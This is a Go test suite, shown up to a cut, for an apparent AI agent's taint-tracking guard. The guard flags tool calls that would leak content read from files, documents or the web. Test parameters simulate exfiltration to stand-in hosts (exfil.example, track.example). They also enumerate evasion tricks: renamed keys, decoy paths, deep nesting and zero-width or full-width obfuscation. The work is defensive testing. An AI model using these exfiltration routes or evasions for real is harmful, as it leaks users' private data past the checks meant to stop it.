package risk

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/CarlosShao/wisp/internal/plugin"
)

// const marker is the planted sensitive fragment used across the suite.
const marker = "MARKER-QZX-98WVE7-TAINTED-SOURCE"

func testProv(t *testing.T, o ProvOptions) *Provenance {
	t.Helper()
	if o.HomeDir == "" {
		o.HomeDir = t.TempDir()
	}
	p := NewProvenance(o)
	p.OpenScope("task-1")
	return p
}

// baseOptions is the shared fixture for the marker/inspection tests. The
// injected OneDrive root lives under fixtureProfile, NOT under o.HomeDir (which
// testProv leaves as its own empty temp dir), so the tests keep distinguishing
// "landed in a detected sync root" from "landed anywhere in the profile, which
// the P12 fallback treats as suspect".
//
// Ticket 75 made the profile a real directory: C26 anchors a spelling it cannot
// verify on the deepest component the OS does confirm, and on POSIX a Windows
// string like `C:\Users\test\OneDrive` is a RELATIVE name, so the old fixture
// compared a root and a candidate that C26 had put in two different places. It
// only ever passed because every POSIX write fail-closed to sync-suspect, which
// is the very behavior ticket 75 fixed.
func baseOptions(t *testing.T) ProvOptions {
	t.Helper()
	return ProvOptions{
		NoProbe: true,
		SyncRoots: []SyncRoot{
			{Provider: "OneDrive", Path: fixtureSyncRoot(t), Source: "options"},
		},
	}
}

// fixtureProfile is the fake user profile the fixture sync root sits in, and
// fixtureSyncRoot the root itself. Both are absolute, existing paths on whatever
// platform runs the test.
func fixtureProfile(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "profile")
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func fixtureSyncRoot(t *testing.T) string {
	t.Helper()
	r := filepath.Join(fixtureProfile(t), "OneDrive")
	if err := os.MkdirAll(r, 0o755); err != nil {
		t.Fatal(err)
	}
	return r
}

// syncTargetOf / nonSyncTargetOf build write-target spellings from the options
// a test was given, so the target and the injected root are guaranteed to come
// from the same fixture (t.TempDir hands out a fresh directory per call).
// nonSyncTargetOf lands in <profile>/Documents, which is neither the injected
// sync root nor under o.HomeDir: the negative control for the channel.
func syncTargetOf(o ProvOptions, parts ...string) string {
	return filepath.Join(append([]string{o.SyncRoots[0].Path}, parts...)...)
}

func nonSyncTargetOf(o ProvOptions, parts ...string) string {
	return filepath.Join(append([]string{filepath.Dir(o.SyncRoots[0].Path), "Documents"}, parts...)...)
}

// --- marking + inspection ----------------------------------------------------

func TestMarkInspectSourceAttribution(t *testing.T) {
	p := testProv(t, baseOptions(t))
	if !p.Mark("task-1", SrcWebFetch, "https://example.com/report.md", "prefix text "+marker+" suffix") {
		t.Fatal("mark rejected")
	}
	hit, ok := p.Inspect("task-1", "web.search", map[string]any{"query": "please search " + marker + " now"})
	if !ok {
		t.Fatal("tainted query must hit")
	}
	if hit.Channel != ChWebSearch {
		t.Errorf("channel: got %q want %q", hit.Channel, ChWebSearch)
	}
	if hit.SrcTool != SrcWebFetch || hit.Origin != "https://example.com/report.md" {
		t.Errorf("attribution: got %q/%q", hit.SrcTool, hit.Origin)
	}
	// The decision must NAME the source (SPEC-06 §5).
	if !strings.Contains(hit.Source(), "web.fetch") || !strings.Contains(hit.Source(), "example.com") {
		t.Errorf("Source() must name tool+origin, got %q", hit.Source())
	}
	if hit.Fragment == "" {
		t.Error("fragment must be reported for the native card")
	}
	if strings.Contains(hit.String(), marker) {
		t.Error("String() must not leak the fragment content")
	}
}

func TestMarkNegativeNoTaintNoHit(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.Mark("task-1", SrcWebFetch, "https://a", marker)
	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "totally unrelated note"}); ok {
		t.Fatal("clean notify must not hit")
	}
}

func TestMarkEmptyAfterNormalization(t *testing.T) {
	p := testProv(t, baseOptions(t))
	if p.Mark("task-1", SrcFSRead, "/tmp/x", "   \n\t  ") {
		t.Fatal("content empty after normalization must be rejected")
	}
}

func TestMarkUnknownSourceToolFailClosed(t *testing.T) {
	var logged []string
	old := Logf
	Logf = func(f string, a ...any) { logged = append(logged, f) }
	defer func() { Logf = old }()

	p := testProv(t, baseOptions(t))
	if !p.Mark("task-1", "mystery.reader", "obj", marker) {
		t.Fatal("unknown-source marks must still be recorded (fail-closed)")
	}
	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": marker}); !ok {
		t.Fatal("taint from an off-list source must still gate")
	}
	if !anyContains(logged, "not a SPEC-06") {
		t.Errorf("off-list marking must be logged, got %v", logged)
	}
}

func TestSensitiveSourceSetComplete(t *testing.T) {
	// AC (ticket 19 Key constraints): all marking sources represented:
	// fs.read / search.content / clipboard.read / sysinfo window title /
	// web.fetch / doc.read / screen.capture / user transcript (from 15).
	for _, tool := range []string{
		SrcFSRead, SrcSearchContent, SrcClipboardRead,
		SrcSystemGet, SrcWebFetch, SrcDocRead, SrcScreenCapture, SrcTranscript,
	} {
		if !IsSensitiveSource(tool) {
			t.Errorf("source %q missing from SPEC-06 §5 set", tool)
		}
	}
	if IsSensitiveSource("fs.list") {
		t.Error("fs.list is not a content source")
	}
}

// --- four/six-channel exfil (AC #1) ------------------------------------------

// TestFourChannelExfilSuite is the red-team suite demanded by SPEC-10 §6 /
// D30①: search.content marker -> web.search query / notify / clipboard.write
// / sync-dir write. All four must upgrade L2 (via the real C19 assessor)
// with the source named.
func TestFourChannelExfilSuite(t *testing.T) {
	o := baseOptions(t)
	p := testProv(t, o)
	p.Mark("task-1", SrcSearchContent, `/docs/corpus "internal audit"`, "found: "+marker)

	cases := []struct {
		name   string
		tool   string
		params map[string]any
		wantCh Channel
	}{
		{"web.search query", "web.search", map[string]any{"query": "search " + marker}, ChWebSearch},
		{"notify text", "notify", map[string]any{"text": "heads up: " + marker}, ChNotify},
		{"notify url", "notify", map[string]any{"url": "https://track.example/?d=" + marker}, ChNotify},
		{"clipboard.write", "clipboard.write", map[string]any{"text": marker}, ChClipboard},
		{"fs.write into sync dir", "fs.write", map[string]any{
			"path": syncTargetOf(o, "Notes", "shared.md"), "content": "see " + marker,
		}, ChSyncWrite},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hit, ok := p.Inspect("task-1", c.tool, c.params)
			if !ok {
				t.Fatalf("%s must exfil-hit", c.name)
			}
			if hit.Channel != c.wantCh {
				t.Errorf("channel: got %q want %q", hit.Channel, c.wantCh)
			}
			if !strings.Contains(hit.Source(), "search.content") {
				t.Errorf("decision must name the source, got %q", hit.Source())
			}
		})
	}

	// The remaining two channels of six (F4): TTS announce (no frozen tool
	// name yet -> CheckText) and HTTP POST body. The channel LABEL is asserted
	// too, not just the hit (adversarial report §2 row 1 reservation).
	if h, ok := p.CheckText("task-1", ChTTS, "reading result aloud: "+marker); !ok {
		t.Error("TTS announce text must be an exfil channel (physical exfil)")
	} else if h.Channel != ChTTS {
		t.Errorf("TTS channel label: got %q want %q", h.Channel, ChTTS)
	}
	if h, ok := p.CheckText("task-1", ChHTTP, "post body contains "+marker); !ok {
		t.Error("HTTP POST body must be an exfil channel")
	} else if h.Channel != ChHTTP {
		t.Errorf("HTTP channel label: got %q want %q", h.Channel, ChHTTP)
	}
	// N-4: the same suite, one transform of the marker further (full-width +
	// case + injected whitespace) — normalization must survive integration.
	if h, ok := p.Inspect("task-1", "notify", map[string]any{
		"text": "ＭＡＲＫＥＲ QZX-98WVE7-ＴＡＩＮＴＥＤ-SOURCE",
	}); !ok {
		t.Error("ESCAPIABLE: transformed marker missed on the notify channel")
	} else if h.Channel != ChNotify {
		t.Errorf("transformed marker lost its channel label: %q", h.Channel)
	}
}

// TestR4EndToEndViaAssessor wires the engine through the frozen C19 seam and
// asserts the fused decision: L2, R4, session-override blocked, source named.
func TestR4EndToEndViaAssessor(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "clause 7: "+marker)

	a := NewRiskAssessor().WithTaintDetector(p.Detector("task-1"))

	d := a.Assess("notify", map[string]any{"text": "summary of clause 7: " + marker}, Facts{})
	if d.Level != L2 {
		t.Fatalf("level: got %v want L2", d.Level)
	}
	if len(d.RulesHit) != 1 || d.RulesHit[0] != R4 {
		t.Fatalf("rules: got %v want [R4]", d.RulesHit)
	}
	if !d.SessionOverrideBlocked {
		t.Fatal("R4 must not be overridable by D45 session grants")
	}
	if !strings.Contains(d.Reason, "包含来自") || !strings.Contains(d.Reason, "doc.read") {
		t.Fatalf("reason must name the source in the contract wording, got %q", d.Reason)
	}

	// Clean call: no rules at all.
	d = a.Assess("notify", map[string]any{"text": "dinner at 7"}, Facts{})
	if d.Level != L0 || len(d.RulesHit) != 0 {
		t.Fatalf("clean notify: got %v/%v", d.Level, d.RulesHit)
	}
}

// TestSyncWriteNegative: fs.write of tainted content to a NON-sync dir is not
// an R4 exfil (SPEC-06 §5: only sync-dir landing is the channel; the write
// itself stays L1/L2 by R1/R8 as usual).
func TestSyncWriteNegative(t *testing.T) {
	o := baseOptions(t)
	p := testProv(t, o)
	p.Mark("task-1", SrcFSRead, "/secrets.txt", marker)

	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
		"path": nonSyncTargetOf(o, "notes.md"), "content": marker,
	}); ok {
		t.Fatal("local (non-sync) write of tainted content must not be an R4 exfil hit")
	}
	// Same via the tool-name-less frozen seam (shape-based): still no hit.
	if src, hit := p.Detector("task-1").TaintHit(map[string]any{
		"path": nonSyncTargetOf(o, "notes.md"), "content": marker,
	}); hit {
		t.Fatalf("adapter must mirror Inspect, got src=%q", src)
	}
	// Unresolvable/missing path on a write is unverifiable -> fail-closed gate.
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{"content": marker}); !ok {
		t.Fatal("fs.write without a verifiable path must fail-closed to the scan")
	}
}

func TestDetectorUnknownToolScansEverything(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.Mark("task-1", SrcClipboardRead, "", "clip "+marker)
	// A plugin tool with no channel entry: generic fail-closed scan of the
	// arbitrary string params.
	src, hit := p.Detector("task-1").TaintHit(map[string]any{
		"payload": map[string]any{"nested": []any{"...", "carries clip " + marker}},
	})
	if !hit || !strings.Contains(src, "clipboard.read") {
		t.Fatalf("unknown tool must be scanned fail-closed, got %q/%v", src, hit)
	}
}

// --- scope lifetime / DisposalScope (AC #5) ----------------------------------

func TestScopesNeverInherit(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.OpenScope("task-2")
	p.Mark("task-1", SrcWebFetch, "https://a", marker)
	if _, ok := p.Inspect("task-2", "web.search", map[string]any{"query": marker}); ok {
		t.Fatal("a second concurrent scope must never see task-1's taint")
	}
}

func TestDisposalScopeClearsTaints(t *testing.T) {
	// C11/DisposalScope binding: closing the scope (session end) must drop
	// every taint; the new session's scope starts clean (AC #5).
	scope := plugin.NewDisposalScope("session-1", context.Background())
	p := NewProvenance(baseOptions(t))
	p.OpenScope("session-1")
	scope.Defer(func() { p.CloseScope("session-1") })

	p.Mark("session-1", SrcFSRead, "/legacy/secret", marker)
	if _, ok := p.Inspect("session-1", "notify", map[string]any{"text": marker}); !ok {
		t.Fatal("taint live within the session")
	}
	if res := scope.Dispose(); res.Incomplete {
		t.Fatalf("dispose incomplete: %+v", res)
	}
	if _, ok := p.Inspect("session-1", "notify", map[string]any{"text": marker}); ok {
		t.Fatal("disposed session must not retain taint")
	}
	p.OpenScope("session-2")
	if _, ok := p.Inspect("session-2", "notify", map[string]any{"text": marker}); ok {
		t.Fatal("new session does not inherit old taints")
	}
	if len(p.ScopeTaints("session-2")) != 0 {
		t.Fatal("new session store must start empty")
	}
}

func TestInspectUnknownScopeIsEmptyStore(t *testing.T) {
	// M-1 (adversarial report): the old default on an unregistered scope was
	// "treated as untainted" = pass. Missing information must produce a DENY,
	// so the direction is now: unknown scope + any taint anywhere -> fail-closed
	// hit; unknown scope + nothing tainted at all -> nothing to leak.
	p := NewProvenance(baseOptions(t))
	if _, ok := p.Inspect("ghost", "notify", map[string]any{"text": marker}); ok {
		t.Fatal("unknown scope with an empty engine cannot carry taint")
	}
	p.OpenScope("task-1")
	p.Mark("task-1", SrcWebFetch, "https://a", marker)

	hit, ok := p.Inspect("ghost", "notify", map[string]any{"text": "unrelated"})
	if !ok {
		t.Fatal("Inspect on an unbound scope while taints exist must fail closed, not pass")
	}
	if hit.SrcTool != SrcUnboundScope || hit.Channel != ChUnknown {
		t.Errorf("fail-closed attribution: got %+v", hit)
	}
	// Same through the frozen C19 seam and through CheckText (TTS/net).
	if src, h := p.Detector("ghost").TaintHit(map[string]any{"text": "unrelated"}); !h || !strings.Contains(src, SrcUnboundScope) {
		t.Errorf("adapter must fail closed too, got %q/%v", src, h)
	}
	if _, h := p.CheckText("ghost", ChTTS, "unrelated"); !h {
		t.Error("CheckText on an unbound scope must fail closed")
	}
	// A closed scope (session ended) is the same shape of mistake.
	p.CloseScope("task-1")
	p.OpenScope("task-2")
	if _, h := p.Inspect("task-2", "notify", map[string]any{"text": "x"}); h {
		t.Fatal("an opened-and-empty scope is legitimately untainted")
	}
	p.Mark("task-2", SrcFSRead, "/f", marker)
	p.CloseScope("task-2") // disposes the taints -> engine empty again
	if _, h := p.Inspect("task-2", "notify", map[string]any{"text": marker}); h {
		t.Fatal("after Dispose the engine holds no taint: no hit is correct (AC#5)")
	}
}

// --- B-2: parameter name / shape escapes --------------------------------------

// TestNamedChannelParamEscape locks the B-2 fixes: the channel table labels
// parameters, it does not limit what is scanned.
func TestNamedChannelParamEscape(t *testing.T) {
	p := testProv(t, baseOptions(t))
	if !p.Mark("task-1", SrcWebFetch, "https://x", "quote: "+marker) {
		t.Fatal("mark rejected")
	}
	cases := []struct {
		name   string
		tool   string
		params map[string]any
		wantCh Channel
	}{
		{"table key still gets its contract label", "web.search", map[string]any{"query": marker}, ChWebSearch},
		{"renamed query key", "web.search", map[string]any{"url": marker}, ChUnknown},
		{"abbreviated key", "web.search", map[string]any{"q": marker}, ChUnknown},
		{"harmless table key, tainted extra key", "notify", map[string]any{"title": marker, "text": "ding"}, ChUnknown},
		{"payload under another name", "clipboard.write", map[string]any{"payload": marker}, ChUnknown},
		{"nested object payload", "notify", map[string]any{"text": map[string]any{"body": marker}}, ChNotify},
		{"array payload", "notify", map[string]any{"text": []any{marker}}, ChNotify},
		{"[]string payload", "clipboard.write", map[string]any{"lines": []string{"ok", marker}}, ChUnknown},
		{"byte payload", "clipboard.write", map[string]any{"raw": []byte(marker)}, ChUnknown},
		{"deep map under an unknown key", "web.search", map[string]any{"meta": map[string]any{"a": map[string]any{"b": marker}}}, ChUnknown},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hit, ok := p.Inspect("task-1", c.tool, c.params)
			if !ok {
				t.Fatalf("ESCAPIABLE: %s/%v not caught by Inspect", c.tool, c.params)
			}
			if hit.Channel != c.wantCh {
				t.Errorf("channel label: got %q want %q", hit.Channel, c.wantCh)
			}
			if !strings.Contains(hit.Source(), "web.fetch") {
				t.Errorf("must name the source, got %q", hit.Source())
			}
		})
	}
	// The adapter (tool-name-less seam) catches the same shapes.
	for _, params := range []map[string]any{
		{"q": marker}, {"payload": marker}, {"text": []any{marker}}, {"raw": []byte(marker)},
	} {
		if _, h := p.Detector("task-1").TaintHit(params); !h {
			t.Errorf("ESCAPIABLE via the frozen seam: %v", params)
		}
	}
	// fs.write payload under a non-table key is scanned even though the
	// content/data keys are sync-gated (B-2 last bullet).
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
		"path": `C:\somewhere\plain\a.txt`, "body": "see " + marker,
	}); !ok {
		t.Fatal("ESCAPIABLE: fs.write body param outside writeChannelKeys")
	}
	// Clean calls on named channels stay clean.
	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "dinner at 7", "url": "https://x"}); ok {
		t.Fatal("clean notify must not hit")
	}
}

// --- M-7: the write/sync gate must not be selectable by parameter name --------

// m7Engine is an engine whose "not a sync dir" verdict can only come from root
// MEMBERSHIP: a registry-grade (confirmed) root switches the under-profile
// suspect net off, and the plain target is a brand-new file in an existing
// non-sync directory — exactly the shape a real fs.write call carries.
func m7Engine(t *testing.T) (p *Provenance, syncTarget, plainTarget string) {
	t.Helper()
	base := t.TempDir()
	home := filepath.Join(base, "profile")
	root := filepath.Join(home, "OneDrive")
	work := filepath.Join(home, "work")
	for _, d := range []string{root, work} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	p = NewProvenance(ProvOptions{NoProbe: true, HomeDir: home, SyncRoots: []SyncRoot{
		{Provider: "OneDrive", Path: root, Source: "registry"},
	}})
	if !p.SyncDetectionComplete() {
		t.Fatal("precondition: the injected registry-grade root must confirm detection, so the suspect net is NOT what decides these cases")
	}
	p.OpenScope("task-1")
	if !p.Mark("task-1", SrcWebFetch, "https://x", "quote: "+marker) {
		t.Fatal("mark rejected")
	}
	return p, filepath.Join(root, "Notes", "out.md"), filepath.Join(work, "brand-new.md")
}

// TestWriteGateNotSelectedByPayloadKey is the M-7 half that must be CAUGHT:
// a payload carrying tainted content in a call that also names a remote sink
// (`url`) or whose tool has a sink of its own is scanned whichever key the
// content arrived in — through Inspect with a tool name, without one, and
// through the frozen C19 seam. Before the fix, `{url, path:<non-sync>,
// data:<tainted>}` passed silently while renaming `data` to `body` was caught:
// whether the safety check ran depended on what the caller named its parameter.
func TestWriteGateNotSelectedByPayloadKey(t *testing.T) {
	p, syncTarget, plain := m7Engine(t)
	if p.IsSyncPath(plain).Sync {
		t.Fatalf("precondition: %s must be judged a plain non-sync write target", plain)
	}
	payloads := map[string]any{
		"data":    "leak " + marker,
		"content": "leak " + marker,
		"body":    "leak " + marker,
		"payload": "leak " + marker,
		"raw":     []byte(marker),
		"lines":   []string{"ok", marker},
		"nested":  map[string]any{"deeper": map[string]any{"x": marker}},
	}
	for name, payload := range payloads {
		// ⑥ with a local-write parameter in the same call: named or unnamed,
		// the remote sink wins — the gate is not keyed on the payload name.
		for _, tool := range []string{"", "http.post", "net.send"} {
			params := map[string]any{"url": "https://exfil.example/upload", "path": plain, name: payload}
			hit, ok := p.Inspect("task-1", tool, params)
			if !ok {
				t.Errorf("ESCAPIABLE (M-7): tool=%q payload key=%q not caught: %v", tool, name, params)
				continue
			}
			if hit.Channel != ChHTTP {
				t.Errorf("tool=%q payload=%q: channel label got %q want %q", tool, name, hit.Channel, ChHTTP)
			}
			if !strings.Contains(hit.Source(), "web.fetch") {
				t.Errorf("must still name the source, got %q", hit.Source())
			}
		}
		// The same shape through the frozen, tool-name-less C19 seam.
		if src, ok := p.Detector("task-1").TaintHit(
			map[string]any{"url": "https://exfil.example/upload", "path": plain, name: payload}); !ok {
			t.Errorf("ESCAPIABLE via the frozen seam (M-7): payload key=%q", name)
		} else if !strings.Contains(src, "web.fetch") {
			t.Errorf("seam attribution: %q", src)
		}
		// A sink-shaped VALUE instead of a sink-shaped KEY: renaming `url`
		// must not close the gate either.
		if _, ok := p.Inspect("task-1", "http.post", map[string]any{
			"endpointish": "https://exfil.example/upload", "path": plain, name: payload,
		}); !ok {
			t.Errorf("ESCAPIABLE: sink renamed to %q (value-shaped check bypassed)", "endpointish")
		}
		// Tools whose D34 contract has a sink of its own never get the
		// local-write exemption, even with a harmless path in the params.
		if _, ok := p.Inspect("task-1", "notify", map[string]any{
			"text": "ding", "path": plain, name: payload,
		}); !ok {
			t.Errorf("ESCAPIABLE: notify with a path param and payload key %q", name)
		}
		if _, ok := p.Inspect("task-1", "clipboard.write", map[string]any{
			"file": plain, name: payload,
		}); !ok {
			t.Errorf("ESCAPIABLE: clipboard.write with a path param and payload key %q", name)
		}
	}
	// A write target that IS a sync dir: the gate is about the target, so a
	// payload under any name hits on the sync channel (channel ⑤ has no
	// key-name escape either).
	if hit, ok := p.Inspect("task-1", "", map[string]any{"path": syncTarget, "data": marker}); !ok {
		t.Fatal("ESCAPIABLE: tainted payload under the name `data` into a sync dir")
	} else if hit.Channel != ChSyncWrite {
		t.Errorf("sync-dir payload label: got %q want %q", hit.Channel, ChSyncWrite)
	}
}

// TestWriteGatePlainLocalWriteNotFlagged is the other half of the M7 fix and
// the false-positive hammer guard the previous round existed to prevent: a
// plain new-file write into a NON-sync directory is still not an exfil
// channel, and the exemption no longer depends on the payload key's name.
func TestWriteGatePlainLocalWriteNotFlagged(t *testing.T) {
	p, syncTarget, plain := m7Engine(t)
	for _, name := range []string{"content", "data", "body", "payload", "raw"} {
		params := map[string]any{"path": plain}
		if name == "raw" {
			params[name] = []byte(marker)
		} else {
			params[name] = "local bytes " + marker
		}
		if hit, ok := p.Inspect("task-1", "", params); ok {
			t.Errorf("false positive: plain local write flagged via tool-name-less seam, payload key=%q (%+v)", name, hit)
		}
		if src, ok := p.Detector("task-1").TaintHit(params); ok {
			t.Errorf("false positive via the frozen seam: plain local write, payload key=%q (src=%q)", name, src)
		}
		// The two contract body keys of fs.write are the same call: the
		// exemption must travel with the SHAPE, not with the name.
		if name == "content" || name == "data" {
			if _, ok := p.Inspect("task-1", "fs.write", params); ok {
				t.Errorf("false positive: fs.write of tainted content to a non-sync dir flagged, payload key=%q", name)
			}
		}
	}
	// A body that merely QUOTES a link is not a remote sink: a plain local
	// write of markdown with URLs in it must stay out of channel ⑥.
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
		"path": plain, "content": "see https://example.com/docs/readme for " + marker,
	}); ok {
		t.Error("false positive: a local write whose text quotes a URL became an exfil channel")
	}
	// Positive controls: the gate is per-call, not switched off. The same
	// engine still flags the sync dir, and flags a write with no verifiable
	// target at all (missing information -> DENY).
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{"path": syncTarget, "content": marker}); !ok {
		t.Error("regression: fs.write into the sync dir must hit")
	}
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{"content": marker}); !ok {
		t.Error("regression: fs.write without a verifiable target must fail closed")
	}
	// N-8 (accepted, documented in docs/PRECHECK.md §P12): on the NAMED
	// fs.write channel the exemption covers the contract body keys only, so an
	// off-contract key on a local write is scanned. That asymmetry points the
	// STRICT way; pinning it here means any future change is a decision.
	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
		"path": plain, "body": marker,
	}); !ok {
		t.Error("N-8 regression: fs.write with an off-contract payload key must stay scanned (fail-closed side)")
	}
	// And a clean call stays clean everywhere.
	if _, ok := p.Inspect("task-1", "http.post", map[string]any{
		"url": "https://example.com/api", "path": plain, "data": "nothing tainted here",
	}); ok {
		t.Error("false positive: untainted payload must not hit")
	}
}

// --- C-3: the write gate must judge EVERY path-shaped parameter ---------------

// TestWriteGateEveryPathTargetJudged is the orchestrator's C-3 probe made
// permanent: writeGate used to examine only the FIRST pathKeys match, so a
// call carrying two path-shaped parameters was judged on one of them — a
// decoy `path` confirmed outside every sync root exempted the payload while
// the real `dest` sat inside OneDrive (the key table's precedence order, not
// the call's shape, decided whether the security check ran). Every path-shaped
// parameter must now be a confirmed non-sync target, on both routes: Inspect
// and the frozen tool-name-less seam. The 4th case is the orchestrator's
// "single sync dest only" control, which already worked; the rest are new.
func TestWriteGateEveryPathTargetJudged(t *testing.T) {
	p, syncTarget, plain := m7Engine(t)
	plain2 := filepath.Join(filepath.Dir(plain), "second-brand-new.md")
	if p.IsSyncPath(plain2).Sync {
		t.Fatalf("precondition: %s must be a plain non-sync target", plain2)
	}
	cases := []struct {
		name   string
		tool   string
		params map[string]any
	}{
		{"decoy path + real dest", "fs.write", map[string]any{
			"path": plain, "dest": syncTarget, "data": "leak " + marker,
		}},
		{"reversed order", "fs.write", map[string]any{
			"dest": syncTarget, "path": plain, "data": "leak " + marker,
		}},
		{"file+destination, no tool name", "", map[string]any{
			"file": plain, "destination": syncTarget, "data": "leak " + marker,
		}},
		{"three-way: path+dest non-sync, file in sync root", "fs.write", map[string]any{
			"path": plain, "dest": plain2, "file": syncTarget, "content": "leak " + marker,
		}},
		{"single sync dest only", "fs.write", map[string]any{
			"dest": syncTarget, "data": "leak " + marker,
		}},
		{"casing decoy: Path hides the sync target from an exact-match scan", "fs.write", map[string]any{
			"path": plain, "Path": syncTarget, "data": "leak " + marker,
		}},
		{"path-shaped key with no checkable value", "fs.write", map[string]any{
			"path": plain, "dest": map[string]any{"inner": syncTarget}, "data": "leak " + marker,
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hit, ok := p.Inspect("task-1", c.tool, c.params)
			if !ok {
				t.Fatalf("ESCAPIABLE (C-3): tool=%q %v not caught", c.tool, c.params)
			}
			if hit.Channel != ChSyncWrite {
				t.Errorf("channel: got %q want %q", hit.Channel, ChSyncWrite)
			}
			if !strings.Contains(hit.Source(), "web.fetch") {
				t.Errorf("must name the source, got %q", hit.Source())
			}
			// The same shape through the frozen, tool-name-less C19 seam.
			if src, h := p.Detector("task-1").TaintHit(c.params); !h {
				t.Errorf("ESCAPIABLE (C-3) via the frozen seam: %v", c.params)
			} else if !strings.Contains(src, "web.fetch") {
				t.Errorf("seam attribution: %q", src)
			}
		})
	}
}

// TestWriteGateAllPathsNonSyncStaysExempt is the no-regression guard C-3 must
// not become a hammer: a call whose ONLY path-shaped targets are confirmed
// non-sync and which has no remote sink is still a plain local write, so the
// payload stays exempt whichever key carries it (multi-target copy/move shape
// of ticket 20; the single-target shape stays pinned by
// TestWriteGatePlainLocalWriteNotFlagged and TestSyncWriteNegative). On the
// named fs.write channel only the two contract body keys are exempt (N-8).
func TestWriteGateAllPathsNonSyncStaysExempt(t *testing.T) {
	p, _, plain := m7Engine(t)
	plain2 := filepath.Join(filepath.Dir(plain), "second-brand-new.md")
	for _, name := range []string{"content", "data", "body", "payload", "raw"} {
		params := map[string]any{"path": plain, "dest": plain2, "destination": plain}
		if name == "raw" {
			params[name] = []byte(marker)
		} else {
			params[name] = "local bytes " + marker
		}
		if hit, ok := p.Inspect("task-1", "", params); ok {
			t.Errorf("false positive (C-3 guard): multi-target plain write flagged, payload key=%q (%+v)", name, hit)
		}
		if src, ok := p.Detector("task-1").TaintHit(params); ok {
			t.Errorf("false positive (C-3 guard) via the frozen seam: payload key=%q (src=%q)", name, src)
		}
		if name == "content" || name == "data" {
			if hit, ok := p.Inspect("task-1", "fs.write", params); ok {
				t.Errorf("false positive (C-3 guard): named fs.write to confirmed non-sync targets flagged, payload key=%q (%+v)", name, hit)
			}
		}
	}
}

// --- M-4: nesting budget must not be a silent miss ----------------------------

func TestDeepNestingFailsClosedNotSilent(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.Mark("task-1", SrcFSRead, "/f", marker)
	// Deeper than the configured budget: the tail cannot be scanned, so the
	// call must fail closed instead of passing (adversarial report M-4).
	nested := map[string]any{"v": marker}
	for i := 0; i < 12; i++ {
		nested = map[string]any{"l": nested}
	}
	hit, ok := p.Inspect("task-1", "some.plugin", map[string]any{"args": nested})
	if !ok {
		t.Fatal("ESCAPIABLE: beyond-MaxParamDepth nesting passed silently")
	}
	if hit.SrcTool != SrcUnscannedNesting {
		t.Errorf("expected the unscanned-nesting fail-closed source, got %+v", hit)
	}
	// Inside the budget it is a real content hit with the content fragment.
	shallow := map[string]any{"v": marker}
	for i := 0; i < 3; i++ {
		shallow = map[string]any{"l": shallow}
	}
	hit2, ok2 := p.Inspect("task-1", "some.plugin", map[string]any{"args": shallow})
	if !ok2 || hit2.SrcTool != SrcFSRead {
		t.Fatalf("shallow nesting must still match by content, got %+v/%v", hit2, ok2)
	}
	// A budget of 0 falls back to the default, never to "scan nothing".
	p2 := NewProvenance(ProvOptions{NoProbe: true, MaxParamDepth: 0})
	p2.OpenScope("s")
	if p2.maxDepth != defaultMaxParamDepth {
		t.Fatalf("maxDepth: got %d want %d", p2.maxDepth, defaultMaxParamDepth)
	}
}

// --- N-4: transforms must survive the full Mark -> Inspect path ---------------

// injectIgnorable interleaves invisible characters (ZWSP/ZWJ/word-joiner/soft
// hyphen/BOM + a combining mark) into s, the M-6 evasion shape.
func injectIgnorable(s string, sep rune) string {
	var b strings.Builder
	for i, r := range s {
		if i > 0 {
			b.WriteRune(sep)
		}
		b.WriteRune(r)
	}
	return b.String()
}

func TestNormalizationEndToEnd(t *testing.T) {
	p := testProv(t, baseOptions(t))
	if !p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "clause 7 read as: "+marker) {
		t.Fatal("mark rejected")
	}
	fw := strings.Map(func(r rune) rune { // full-width spelling of the marker
		if r >= '!' && r <= '~' {
			return r + 0xFEE0
		}
		return r
	}, marker)
	for name, variant := range map[string]string{
		"lowercase":        strings.ToLower(marker),
		"whitespace split": strings.Join(strings.Split(marker, ""), "   "),
		"full-width":       fw,
		"zero-width split": injectIgnorable(marker, 0x200B),
		"soft-hyphen":      injectIgnorable(marker, 0x00AD),
		"bom/word-joiner":  injectIgnorable(marker, 0xFEFF),
		"combining mark":   injectIgnorable(marker, 0x0301),
	} {
		t.Run(name, func(t *testing.T) {
			if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "summary: " + variant}); !ok {
				t.Fatalf("ESCAPIABLE: normalized variant %q of a marked fragment did not hit", name)
			}
		})
	}
	// The evasion must be symmetric: an unmarked lookalike still does not hit.
	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": injectIgnorable("NOT-THE-MARKER-AT-ALL", 0x200B)}); ok {
		t.Fatal("false positive on unrelated content")
	}
}

// --- thresholds from config, never weakened (hard rule) -----------------------

func TestFragmentThresholdClampedToContractFloor(t *testing.T) {
	// A (wrongly) looser config value must not weaken the >=8 contract.
	p := NewProvenance(ProvOptions{NoProbe: true, MinFragmentChars: 12})
	p.OpenScope("s")
	p.Mark("s", SrcFSRead, "/f", "ABCDEFGH rest") // exactly 8 shared chars
	if _, ok := p.Inspect("s", "notify", map[string]any{"text": "prefix ABCDEFGH"}); !ok {
